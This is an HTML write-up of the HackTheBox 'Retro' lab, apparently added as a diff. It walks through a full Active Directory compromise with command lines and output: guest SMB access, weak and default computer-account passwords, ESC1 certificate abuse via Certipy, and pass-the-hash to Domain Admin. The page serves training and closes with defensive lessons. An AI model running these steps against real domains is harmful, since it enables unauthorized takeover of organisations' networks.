@@ -1,0 +1,932 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB: Retro - Writeup</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0f1419;
+            color: #d4d4d4;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            background: linear-gradient(135deg, #141e30 0%, #243b55 100%);
+            border-bottom: 3px solid #9fef00;
+            padding: 40px 0;
+            margin-bottom: 40px;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        h1 {
+            color: #9fef00;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(159, 239, 0, 0.3);
+        }
+
+        .box-info {
+            background: #1a1f2e;
+            border-left: 4px solid #9fef00;
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 5px;
+        }
+
+        .box-info table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .box-info td {
+            padding: 10px;
+            border-bottom: 1px solid #2d3748;
+        }
+
+        .box-info td:first-child {
+            font-weight: bold;
+            color: #9fef00;
+            width: 200px;
+        }
+
+        h2 {
+            color: #9fef00;
+            font-size: 2em;
+            margin: 40px 0 20px 0;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #2d3748;
+        }
+
+        h3 {
+            color: #4fd5d6;
+            font-size: 1.5em;
+            margin: 30px 0 15px 0;
+        }
+
+        h4 {
+            color: #8b949e;
+            font-size: 1.2em;
+            margin: 20px 0 10px 0;
+        }
+
+        p {
+            margin: 15px 0;
+            color: #d4d4d4;
+        }
+
+        .summary {
+            background: #1a1f2e;
+            border-left: 4px solid #4fd5d6;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .tool-box {
+            background: #1a1f2e;
+            border: 1px solid #2d3748;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .tool-box h4 {
+            color: #9fef00;
+            margin-top: 0;
+        }
+
+        pre {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 16px;
+            overflow-x: auto;
+            margin: 20px 0;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.9em;
+            line-height: 1.5;
+        }
+
+        code {
+            color: #79c0ff;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        .command {
+            color: #9fef00;
+        }
+
+        .output {
+            color: #d4d4d4;
+        }
+
+        .comment {
+            color: #8b949e;
+            font-style: italic;
+        }
+
+        .flag {
+            background: linear-gradient(135deg, #1a472a 0%, #2d5a3d 100%);
+            border-left: 4px solid #9fef00;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+
+        .warning {
+            background: #3d2a1a;
+            border-left: 4px solid #ff9800;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .info {
+            background: #1a2a3d;
+            border-left: 4px solid #4fd5d6;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        ul, ol {
+            margin: 15px 0 15px 40px;
+        }
+
+        li {
+            margin: 10px 0;
+        }
+
+        strong {
+            color: #9fef00;
+        }
+
+        .toc {
+            background: #1a1f2e;
+            border: 1px solid #2d3748;
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 5px;
+        }
+
+        .toc h3 {
+            margin-top: 0;
+            color: #9fef00;
+        }
+
+        .toc ul {
+            list-style: none;
+            margin-left: 0;
+        }
+
+        .toc a {
+            color: #4fd5d6;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .toc a:hover {
+            color: #9fef00;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            background: #1a1f2e;
+        }
+
+        th {
+            background: #2d3748;
+            color: #9fef00;
+            padding: 12px;
+            text-align: left;
+            border: 1px solid #30363d;
+        }
+
+        td {
+            padding: 12px;
+            border: 1px solid #30363d;
+        }
+
+        tr:hover {
+            background: #1e2936;
+        }
+
+        .attack-chain {
+            counter-reset: step-counter;
+            list-style: none;
+            margin-left: 0;
+        }
+
+        .attack-chain li {
+            counter-increment: step-counter;
+            margin: 20px 0;
+            padding-left: 60px;
+            position: relative;
+        }
+
+        .attack-chain li::before {
+            content: counter(step-counter);
+            position: absolute;
+            left: 0;
+            top: 0;
+            background: #9fef00;
+            color: #0f1419;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+
+        footer {
+            margin-top: 60px;
+            padding: 30px 0;
+            border-top: 2px solid #2d3748;
+            text-align: center;
+            color: #8b949e;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2em;
+            }
+            
+            h2 {
+                font-size: 1.5em;
+            }
+            
+            pre {
+                font-size: 0.8em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-content">
+            <h1>HTB: Retro</h1>
+            <p style="color: #8b949e;">A comprehensive walkthrough of the Retro machine from HackTheBox</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="box-info">
+            <table>
+                <tr>
+                    <td>Name</td>
+                    <td>Retro</td>
+                </tr>
+                <tr>
+                    <td>OS</td>
+                    <td>Windows</td>
+                </tr>
+                <tr>
+                    <td>Difficulty</td>
+                    <td><span style="color: #9fef00;">Easy</span></td>
+                </tr>
+                <tr>
+                    <td>IP Address</td>
+                    <td>10.129.234.44</td>
+                </tr>
+                <tr>
+                    <td>Release Date</td>
+                    <td>June 24, 2025</td>
+                </tr>
+                <tr>
+                    <td>Points</td>
+                    <td>20</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="summary">
+            <h3>Summary</h3>
+            <p>Retro is an Easy Windows Active Directory machine that demonstrates several common misconfigurations in enterprise environments. The attack path involves anonymous SMB enumeration revealing hints about weak credentials, exploiting a shared trainee account with a trivial password, discovering and exploiting a Pre-Windows 2000 computer account, abusing misconfigured Active Directory Certificate Services (ESC1), and ultimately obtaining Domain Administrator access.</p>
+        </div>
+
+        <div class="toc">
+            <h3>Table of Contents</h3>
+            <ul>
+                <li><a href="#tools">Tool Explanations</a></li>
+                <li><a href="#recon">Reconnaissance</a></li>
+                <li><a href="#initial-access">Initial Access - SMB Enumeration</a></li>
+                <li><a href="#privesc">Privilege Escalation</a></li>
+                <li><a href="#adcs">ADCS Exploitation (ESC1)</a></li>
+                <li><a href="#shell">Getting Administrator Shell</a></li>
+                <li><a href="#summary">Summary & Key Takeaways</a></li>
+            </ul>
+        </div>
+
+        <section id="tools">
+            <h2>Tool Explanations for Beginners</h2>
+            <p>Before diving into the walkthrough, here are explanations of the tools we'll use:</p>
+
+            <div class="tool-box">
+                <h4>Nmap</h4>
+                <p><strong>What it does:</strong> Nmap (Network Mapper) is a network scanning tool that discovers which ports are open on a target machine and what services are running.</p>
+                <p><strong>Common flags:</strong></p>
+                <ul>
+                    <li><code>-sC</code>: Runs default scripts to gather more information</li>
+                    <li><code>-sV</code>: Detects service versions</li>
+                    <li><code>-T4</code>: Sets timing template (0-5, where 4 is aggressive but not overwhelming)</li>
+                    <li><code>-p-</code>: Scans all 65535 ports (default only scans top 1000)</li>
+                </ul>
+            </div>
+
+            <div class="tool-box">
+                <h4>NetExec (formerly CrackMapExec)</h4>
+                <p><strong>What it does:</strong> A post-exploitation tool for assessing the security of large Active Directory networks. It can test credentials, enumerate shares, users, and more.</p>
+                <p><strong>Common options:</strong></p>
+                <ul>
+                    <li><code>--shares</code>: Lists available SMB shares</li>
+                    <li><code>--rid-brute</code>: Enumerates users by cycling through RID (Relative Identifier) numbers</li>
+                    <li><code>-u</code>: Specifies username</li>
+                    <li><code>-p</code>: Specifies password</li>
+                </ul>
+            </div>
+
+            <div class="tool-box">
+                <h4>SMBClient</h4>
+                <p><strong>What it does:</strong> A client program for accessing SMB/CIFS shares, similar to FTP but for Windows file sharing.</p>
+                <p><strong>Common commands:</strong></p>
+                <ul>
+                    <li><code>dir</code> or <code>ls</code>: Lists files in current directory</li>
+                    <li><code>get &lt;filename&gt;</code>: Downloads a file</li>
+                    <li><code>cd &lt;directory&gt;</code>: Changes directory</li>
+                </ul>
+            </div>
+
+            <div class="tool-box">
+                <h4>Certipy</h4>
+                <p><strong>What it does:</strong> A Python tool for enumerating and abusing Active Directory Certificate Services (ADCS). It can find vulnerable certificate templates and exploit them.</p>
+                <p><strong>Common commands:</strong></p>
+                <ul>
+                    <li><code>find</code>: Searches for certificate templates and identifies vulnerabilities</li>
+                    <li><code>req</code>: Requests a certificate from a Certificate Authority</li>
+                    <li><code>auth</code>: Authenticates using a certificate to obtain credentials</li>
+                </ul>
+            </div>
+
+            <div class="tool-box">
+                <h4>Impacket Suite</h4>
+                <p><strong>What it does:</strong> A collection of Python scripts for working with network protocols, particularly useful in Active Directory environments.</p>
+                <p><strong>Scripts we use:</strong></p>
+                <ul>
+                    <li><code>changepasswd.py</code>: Changes passwords using various protocols</li>
+                    <li><code>lookupsid.py</code>: Enumerates users via their Security Identifiers (SIDs)</li>
+                </ul>
+            </div>
+
+            <div class="tool-box">
+                <h4>Evil-WinRM</h4>
+                <p><strong>What it does:</strong> A tool for connecting to Windows machines using WinRM (Windows Remote Management), essentially giving you a PowerShell session.</p>
+                <p><strong>Common options:</strong></p>
+                <ul>
+                    <li><code>-i</code>: Target IP address</li>
+                    <li><code>-u</code>: Username</li>
+                    <li><code>-H</code>: NT hash (pass-the-hash attack)</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="recon">
+            <h2>Reconnaissance</h2>
+
+            <h3>Initial Port Scan</h3>
+            <p>We start by scanning all ports on the target to identify open services:</p>
+
+            <pre><code class="command">nmap 10.129.234.44 -sC -sV -T4</code></pre>
+
+            <div class="info">
+                <strong>Command breakdown:</strong>
+                <ul>
+                    <li><code>nmap</code>: The network scanning tool</li>
+                    <li><code>10.129.234.44</code>: Target IP address</li>
+                    <li><code>-sC</code>: Run default Nmap scripts for additional enumeration</li>
+                    <li><code>-sV</code>: Detect service versions on open ports</li>
+                    <li><code>-T4</code>: Use aggressive timing (faster scan)</li>
+                </ul>
+            </div>
+
+            <pre><code class="output">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-05 02:15 CST
+Nmap scan report for DC.retro.vl (10.129.234.44)
+Host is up (0.0079s latency).
+Not shown: 987 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-05 08:15:35Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+60020/tcp open  msrpc         Microsoft Windows RPC
+
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre>
+
+            <h3>Analysis of Scan Results</h3>
+            <p>The open ports indicate this is a <strong>Windows Domain Controller</strong>:</p>
+            <ul>
+                <li><strong>Port 53 (DNS)</strong>: Domain Name System service</li>
+                <li><strong>Port 88 (Kerberos)</strong>: Authentication protocol used by Active Directory</li>
+                <li><strong>Port 135, 593 (MSRPC)</strong>: Microsoft Remote Procedure Call</li>
+                <li><strong>Port 139, 445 (SMB)</strong>: File sharing protocol</li>
+                <li><strong>Port 389, 636, 3268, 3269 (LDAP/LDAPS)</strong>: Directory service access</li>
+                <li><strong>Port 464</strong>: Kerberos password change</li>
+                <li><strong>Port 3389 (RDP)</strong>: Remote Desktop Protocol</li>
+            </ul>
+
+            <div class="info">
+                <strong>Key findings:</strong>
+                <ul>
+                    <li><strong>Domain:</strong> retro.vl</li>
+                    <li><strong>Hostname:</strong> DC</li>
+                    <li><strong>OS:</strong> Windows Server 2022 (Build 20348)</li>
+                    <li><strong>NetBIOS Domain Name:</strong> RETRO</li>
+                    <li><strong>Fully Qualified Domain Name:</strong> DC.retro.vl</li>
+                </ul>
+            </div>
+
+            <h3>Setting up /etc/hosts</h3>
+            <p>To make our commands cleaner, we add the domain to our hosts file:</p>
+            <pre><code class="command">echo "10.129.234.44 DC.retro.vl retro.vl DC" | sudo tee -a /etc/hosts</code></pre>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access - SMB Enumeration</h2>
+
+            <h3>Testing Anonymous/Guest Access</h3>
+            <p>With SMB (port 445) available, we test if anonymous or guest access is permitted:</p>
+
+            <pre><code class="command">netexec smb 10.129.234.44 -u guest -p '' --shares</code></pre>
+
+            <pre><code class="output">SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+SMB         10.129.234.44   445    DC               [+] retro.vl\guest: 
+SMB         10.129.234.44   445    DC               [*] Enumerated shares
+SMB         10.129.234.44   445    DC               Share           Permissions     Remark
+SMB         10.129.234.44   445    DC               -----           -----------     ------
+SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.234.44   445    DC               C$                              Default share
+SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.234.44   445    DC               NETLOGON                        Logon server share 
+SMB         10.129.234.44   445    DC               Notes                           
+SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share 
+SMB         10.129.234.44   445    DC               Trainees        READ</code></pre>
+
+            <div class="warning">
+                <strong>Key finding:</strong> The guest account has READ access to the <strong>Trainees</strong> share! This is unusual and worth investigating.
+            </div>
+
+            <h3>Exploring the Trainees Share</h3>
+            <p>We connect to the Trainees share using smbclient:</p>
+
+            <pre><code class="command">smbclient //10.129.234.44/Trainees -U 'Guest'</code></pre>
+
+            <p>When prompted for a password, we just press Enter (empty password).</p>
+
+            <pre><code class="output">smb: \> dir
+  .                                   D        0  Sun Jul 23 16:58:43 2023
+  ..                                DHS        0  Wed Jun 11 09:17:10 2025
+  Important.txt                       A      288  Sun Jul 23 17:00:13 2023
+
+smb: \> get Important.txt
+getting file \Important.txt of size 288 as Important.txt (9.1 KiloBytes/sec)</code></pre>
+
+            <p><strong>Contents of Important.txt:</strong></p>
+            <pre><code class="output">Dear Trainees,
+
+I know that some of you seemed to struggle with remembering strong and unique passwords.
+So we decided to bundle every one of you up into one account.
+Stop bothering us. Please. We have other stuff to do than resetting your password every day.
+
+Regards
+
+The Admins</code></pre>
+
+            <h3>Analyzing the Clue</h3>
+            <p>This note reveals:</p>
+            <ol>
+                <li>There's a shared <strong>trainee</strong> account used by multiple trainees</li>
+                <li>The admins are frustrated with password resets</li>
+                <li>The password is likely <strong>simple</strong> to remember</li>
+            </ol>
+
+            <p>Given the context of "struggling with passwords" and creating a shared account, the password might be something trivial like the username itself.</p>
+
+            <h3>Testing Credentials</h3>
+            <p>We attempt to authenticate as <code>trainee</code> with password <code>trainee</code>:</p>
+
+            <pre><code class="command">netexec smb dc.retro.vl -u trainee -p trainee</code></pre>
+
+            <pre><code class="output">SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee</code></pre>
+
+            <div class="info">
+                <strong>Success!</strong> The credentials <code>trainee:trainee</code> are valid.
+            </div>
+
+            <h3>Accessing the Notes Share</h3>
+            <p>Now with valid credentials, let's see what else we can access:</p>
+
+            <pre><code class="command">smbclient //10.129.234.44/Notes -U 'Trainee'</code></pre>
+
+            <pre><code class="output">smb: \> dir
+  .                                   D        0  Tue Apr  8 22:12:49 2025
+  ..                                DHS        0  Wed Jun 11 09:17:10 2025
+  ToDo.txt                            A      248  Sun Jul 23 17:05:56 2023
+  user.txt                            A       32  Tue Apr  8 22:13:01 2025
+
+smb: \> get ToDo.txt
+smb: \> get user.txt</code></pre>
+
+            <div class="flag">
+                <strong>User flag:</strong><span class="redacted">&lt;REDACTED&gt;</span></code></pre>
+            </div>
+
+            <p><strong>Contents of ToDo.txt:</strong></p>
+            <pre><code class="output">Thomas,
+
+after convincing the finance department to get rid of their ancienct banking software
+it is finally time to clean up the mess they made. We should start with the pre created
+computer account. That one is older than me.
+
+Best
+
+James</code></pre>
+
+            <div class="info">
+                <strong>Key information:</strong>
+                <ul>
+                    <li>There's an old banking-related computer account</li>
+                    <li>It's a "pre created computer account"</li>
+                    <li>The note emphasizes it's very old ("older than me")</li>
+                </ul>
+                <p>This is a strong hint about a <strong>Pre-Windows 2000 computer account</strong> vulnerability!</p>
+            </div>
+        </section>
+
+        <section id="privesc">
+            <h2>Privilege Escalation Path</h2>
+
+            <h3>User Enumeration via RID Brute Force</h3>
+            <p>To find the computer account mentioned in the note, we enumerate domain users using RID brute forcing:</p>
+
+            <pre><code class="command">netexec smb dc.retro.vl -u guest -p '' --rid-brute</code></pre>
+
+            <div class="info">
+                <strong>What is RID brute forcing?</strong>
+                <p>Every Active Directory object has a Relative Identifier (RID) - a sequential number. By cycling through RID numbers, we can enumerate all users and computers in the domain without special privileges.</p>
+            </div>
+
+            <pre><code class="output">SMB         10.129.234.44   445    DC               [+] retro.vl\guest: 
+SMB         10.129.234.44   445    DC               500: RETRO\Administrator (SidTypeUser)
+SMB         10.129.234.44   445    DC               501: RETRO\Guest (SidTypeUser)
+SMB         10.129.234.44   445    DC               502: RETRO\krbtgt (SidTypeUser)
+...
+SMB         10.129.234.44   445    DC               1104: RETRO\trainee (SidTypeUser)
+SMB         10.129.234.44   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
+SMB         10.129.234.44   445    DC               1107: RETRO\jburley (SidTypeUser)
+...</code></pre>
+
+            <div class="warning">
+                <strong>Key finding:</strong> <code>RETRO\BANKING$</code> - This is the computer account mentioned in the note!
+            </div>
+
+            <h3>Understanding Pre-Windows 2000 Computer Accounts</h3>
+            <div class="info">
+                <p><strong>What is a Pre-Windows 2000 computer account?</strong></p>
+                <p>In older Windows environments, administrators could pre-create computer accounts before the actual computer joined the domain. These accounts had a default password set to the computer name (in lowercase, without the <code>$</code> suffix).</p>
+                <p>So for <code>BANKING$</code>, the default password would be: <code>banking</code></p>
+                <p><strong>Why is this a vulnerability?</strong></p>
+                <p>If these accounts are never changed and remain in the domain, they become easy targets for attackers who know about this default behavior.</p>
+            </div>
+
+            <h3>Testing the Pre-2000 Password</h3>
+            <pre><code class="command">netexec smb dc.retro.vl -u 'BANKING$' -p banking</code></pre>
+
+            <pre><code class="output">SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+SMB         10.129.234.44   445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code></pre>
+
+            <div class="warning">
+                <strong>What does this error mean?</strong>
+                <p>The error <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code> actually <strong>confirms</strong> we have the correct password! This specific error occurs when:</p>
+                <ul>
+                    <li>The password is correct</li>
+                    <li>But the computer account hasn't been properly activated yet</li>
+                </ul>
+                <p>It's different from the <code>STATUS_LOGON_FAILURE</code> error you'd get with a wrong password.</p>
+            </div>
+
+            <h3>Changing the BANKING$ Password</h3>
+            <p>Since we can't authenticate directly over SMB, we need to change the password using a different protocol. We'll use the Impacket tool <code>changepasswd.py</code>.</p>
+
+            <pre><code class="command">python3 changepasswd.py -newpass 0xdf0xdf 'retro.vl/BANKING$:banking@dc.retro.vl' -protocol rpc-samr</code></pre>
+
+            <pre><code class="output">Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Changing the password of retro.vl\BANKING$
+[*] Connecting to DCE/RPC as retro.vl\BANKING$
+[*] Password was changed successfully.</code></pre>
+
+            <h3>Verifying the New Credentials</h3>
+            <pre><code class="command">netexec smb dc.retro.vl -u 'BANKING$' -p 0xdf0xdf</code></pre>
+
+            <pre><code class="output">SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+SMB         10.129.234.44   445    DC               [+] retro.vl\BANKING$:0xdf0xdf</code></pre>
+
+            <div class="info">
+                Perfect! We now have working credentials for the <code>BANKING$</code> computer account.
+            </div>
+        </section>
+
+        <section id="adcs">
+            <h2>ADCS Exploitation (ESC1)</h2>
+
+            <h3>Enumerating Active Directory Certificate Services</h3>
+            <p>Now that we have valid computer account credentials, we can enumerate ADCS for vulnerabilities:</p>
+
+            <pre><code class="command">certipy find -u 'BANKING$@retro.vl' -p 0xdf0xdf -vulnerable -stdout</code></pre>
+
+            <pre><code class="output">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+
+Certificate Templates
+  0
+    Template Name                       : RetroClients
+    Display Name                        : Retro Clients
+    Certificate Authorities             : retro-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Client Authentication
+    Minimum RSA Key Length              : 4096
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : RETRO.VL\Domain Admins
+                                          RETRO.VL\Domain Computers
+                                          RETRO.VL\Enterprise Admins
+    [!] Vulnerabilities
+      ESC1                              : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication</code></pre>
+
+            <h3>Understanding ESC1 Vulnerability</h3>
+            <div class="info">
+                <p><strong>What is ESC1?</strong></p>
+                <p>ESC1 is a misconfiguration in ADCS where a certificate template has these dangerous properties:</p>
+                <ol>
+                    <li><strong>Enrollee Supplies Subject</strong> = True (the requester can specify what user the cert is for)</li>
+                    <li><strong>Client Authentication</strong> = Enabled (the cert can be used to authenticate as that user)</li>
+                    <li><strong>Enrollment permissions</strong> allow low-privileged users (like Domain Computers)</li>
+                </ol>
+                <p><strong>Why is this dangerous?</strong></p>
+                <p>We (as BANKING$) can:</p>
+                <ol>
+                    <li>Request a certificate</li>
+                    <li>Say it's for "administrator"</li>
+                    <li>Use that certificate to authenticate as administrator!</li>
+                </ol>
+            </div>
+
+            <h3>Requesting a Certificate (First Attempt - FAILED)</h3>
+            <pre><code class="command">certipy req -u 'BANKING$@retro.vl' -p 0xdf0xdf -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl</code></pre>
+
+            <pre><code class="output">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 12
+[-] Got error: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.</code></pre>
+
+            <div class="warning">
+                <strong>Error: Key length too small!</strong>
+                <p>Remember from the enumeration: <code>Minimum RSA Key Length: 4096</code></p>
+                <p>Certipy's default key size is 2048 bits, but this template requires 4096 bits.</p>
+            </div>
+
+            <h3>Requesting Certificate with Correct Key Size</h3>
+            <p>We need to add the <code>-key-size</code> parameter and the administrator SID:</p>
+
+            <div class="info">
+                <strong>Administrator SID:</strong>
+                <p>From our RID brute force output, we know Administrator has RID <strong>500</strong>.</p>
+                <p>The domain SID is: <code>S-1-5-21-2983547755-698260136-4283918172</code></p>
+                <p>Therefore, administrator SID: <code>S-1-5-21-2983547755-698260136-4283918172-500</code></p>
+            </div>
+
+            <pre><code class="command">certipy req -u 'BANKING$@retro.vl' -p 0xdf0xdf -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -sid S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096</code></pre>
+
+            <pre><code class="output">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 14
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@retro.vl'
+[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
+[*] Saved certificate and private key to 'administrator.pfx'</code></pre>
+
+            <div class="info">
+                <strong>Perfect!</strong> This time we have a proper certificate with the correct SID embedded.
+            </div>
+
+            <h3>Authenticating with the Certificate</h3>
+            <p>Now we use the certificate to authenticate and retrieve the administrator's credentials:</p>
+
+            <pre><code class="command">certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44</code></pre>
+
+            <pre><code class="output">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@retro.vl
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389</code></pre>
+
+            <div class="info">
+                <strong>Excellent!</strong> We now have:
+                <ul>
+                    <li><strong>TGT (Ticket Granting Ticket)</strong>: Saved in <code>administrator.ccache</code></li>
+                    <li><strong>NT Hash</strong>: <code>252fac7066d93dd009d4fd2cd0368389</code></li>
+                </ul>
+                <p>Both can be used to authenticate as the administrator!</p>
+            </div>
+        </section>
+
+        <section id="shell">
+            <h2>Getting Administrator Shell</h2>
+
+            <h3>Using Evil-WinRM with Pass-the-Hash</h3>
+            <p>We'll use Evil-WinRM to get a PowerShell session using the NT hash:</p>
+
+            <pre><code class="command">evil-winrm -i dc.retro.vl -u administrator -H 252fac7066d93dd009d4fd2cd0368389</code></pre>
+
+            <pre><code class="output">Evil-WinRM shell v3.5
+                                        
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents></code></pre>
+
+            <div class="info">
+                <strong>We're in!</strong> We now have a PowerShell session as the Domain Administrator.
+            </div>
+
+            <h3>Retrieving the Root Flag</h3>
+            <pre><code class="command">*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir</code></pre>
+
+            <pre><code class="output">    Directory: C:\Users\Administrator\Desktop
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          4/8/2025   8:11 PM             32 root.txt</code></pre>
+
+            <pre><code class="command">*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt</code></pre>
+			
+            <div class="flag">
+                <strong>Root flag:</strong><span class="redacted">&lt;REDACTED&gt;</span></code></pre>
+            </div>
+			
+        </section>
+
+        <section id="summary">
+            <h2>Summary and Key Takeaways</h2>
+
+            <h3>Attack Chain</h3>
+            <ol class="attack-chain">
+                <li>
+                    <strong>Initial Enumeration</strong>
+                    <p>Discovered Windows Domain Controller via nmap. Domain: retro.vl, Hostname: DC</p>
+                </li>
+                <li>
+                    <strong>SMB Guest Access</strong>
+                    <p>Guest account could read "Trainees" share. Found note hinting at weak shared trainee account</p>
+                </li>
+                <li>
+                    <strong>Weak Credentials</strong>
+                    <p>Tested trainee:trainee → Success. Gained access to "Notes" share → <strong>User flag</strong></p>
+                </li>
+                <li>
+                    <strong>User Enumeration</strong>
+                    <p>RID brute force revealed BANKING$ computer account. Note hinted at old Pre-Windows 2000 account</p>
+                </li>
+                <li>
+                    <strong>Pre-Windows 2000 Exploitation</strong>
+                    <p>Confirmed default password: banking. Changed password using changepasswd.py with RPC-SAMR protocol</p>
+                </li>
+                <li>
+                    <strong>ADCS Enumeration</strong>
+                    <p>Found vulnerable "RetroClients" template. ESC1: Enrollee Supplies Subject + Client Authentication</p>
+                </li>
+                <li>
+                    <strong>Certificate Request</strong>
+                    <p>First attempt failed: key size too small. Second attempt: added -key-size 4096 but missing SID. Third attempt: included both key size and SID → Success</p>
+                </li>
+                <li>
+                    <strong>Administrator Access</strong>
+                    <p>Authenticated with certificate. Retrieved administrator NT hash. Used Evil-WinRM with pass-the-hash → <strong>Root flag</strong></p>
+                </li>
+            </ol>
+
+            <h3>Lessons Learned</h3>
+            
+            <div class="info">
+                <h4>For Security Professionals:</h4>
+                <ul>
+                    <li>Disable guest access to SMB shares</li>
+                    <li>Enforce strong password policies even for shared accounts</li>
+                    <li>Remove or properly secure Pre-Windows 2000 computer accounts</li>
+                    <li>Regularly audit ADCS certificate templates for ESC vulnerabilities</li>
+                    <li>Monitor for certificate enrollments requesting privileged accounts</li>
+                </ul>
+            </div>
+
+            <div class="info">
+                <h4>For Penetration Testers:</h4>
+                <ul>
+                    <li>Always test guest/anonymous access to SMB</li>
+                    <li>Notes and README files often contain valuable information</li>
+                    <li>Pre-2000 computer accounts use hostname (lowercase) as password</li>
+                    <li>ADCS misconfigurations are common in enterprise environments</li>
+                    <li>When troubleshooting, read error messages carefully (key size, SID requirements)</li>
+                </ul>
+            </div>
+
+            <h3>Tools Used</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Tool</th>
+                        <th>Purpose</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Nmap</td>
+                        <td>Port scanning and service enumeration</td>
+                    </tr>
+                    <tr>
